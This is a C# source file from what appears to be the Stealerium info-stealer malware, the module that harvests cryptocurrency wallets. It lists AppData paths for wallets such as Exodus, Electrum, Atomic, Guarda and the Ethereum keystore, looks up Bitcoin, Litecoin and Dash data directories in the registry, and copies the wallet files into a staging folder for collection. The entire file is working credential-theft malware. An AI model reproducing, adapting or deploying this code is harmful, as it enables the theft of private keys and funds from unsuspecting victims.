using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target
{
    internal sealed class Wallets
    {
        // Wallets list directories
        private static readonly List<string[]> SWalletsDirectories = new List<string[]>
        {
            new[] {"Zcash", Paths.Appdata + "\\Zcash"},
            new[] {"Armory", Paths.Appdata + "\\Armory"},
            new[] {"Bytecoin", Paths.Appdata + "\\bytecoin"},
            new[] {"Jaxx", Paths.Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"},
            new[] {"Exodus", Paths.Appdata + "\\Exodus\\exodus.wallet"},
            new[] {"Ethereum", Paths.Appdata + "\\Ethereum\\keystore"},
            new[] {"Electrum", Paths.Appdata + "\\Electrum\\wallets"},
            new[] {"AtomicWallet", Paths.Appdata + "\\atomic\\Local Storage\\leveldb"},
            new[] {"Guarda", Paths.Appdata + "\\Guarda\\Local Storage\\leveldb"},
            new[] {"Coinomi", Paths.Lappdata + "\\Coinomi\\Coinomi\\wallets"}
        };

        // Wallets list from registry
        private static readonly string[] SWalletsRegistry =
        {
            "Litecoin",
            "Dash",
            "Bitcoin"
        };

        // Write wallet.dat
        public static void GetWallets(string sSaveDir)
        {
            try
            {
                Directory.CreateDirectory(sSaveDir);

                foreach (var wallet in SWalletsDirectories)
                    CopyWalletFromDirectoryTo(sSaveDir, wallet[1], wallet[0]);

                foreach (var wallet in SWalletsRegistry)
                    CopyWalletFromRegistryTo(sSaveDir, wallet);

                if (Counter.Wallets == 0)
                    Filemanager.RecursiveDelete(sSaveDir);
            }
            catch (Exception ex)
            {
                Logging.Log("Wallets >> Failed collect wallets\n" + ex);
            }
        }

        // Copy wallet files to directory
        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
        {
            var sdir = Path.Combine(sSaveDir, sWalletName);
            if (!Directory.Exists(sWalletDir)) return;
            Filemanager.CopyDirectory(sWalletDir, sdir);
            Counter.Wallets++;
        }

        // Copy wallet from registry to directory
        private static void CopyWalletFromRegistryTo(string sSaveDir, string sWalletRegistry)
        {
            var sdir = Path.Combine(sSaveDir, sWalletRegistry);
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey(sWalletRegistry)
                           ?.OpenSubKey($"{sWalletRegistry}-Qt"))
                {
                    if (registryKey == null) return;
                    var cdir = registryKey.GetValue("strDataDir") + "\\wallets";
                    if (!Directory.Exists(cdir)) return;
                    Filemanager.CopyDirectory(cdir, sdir);
                    Counter.Wallets++;
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Wallets >> Failed to collect wallet from registry\n" + ex);
            }
        }
    }
}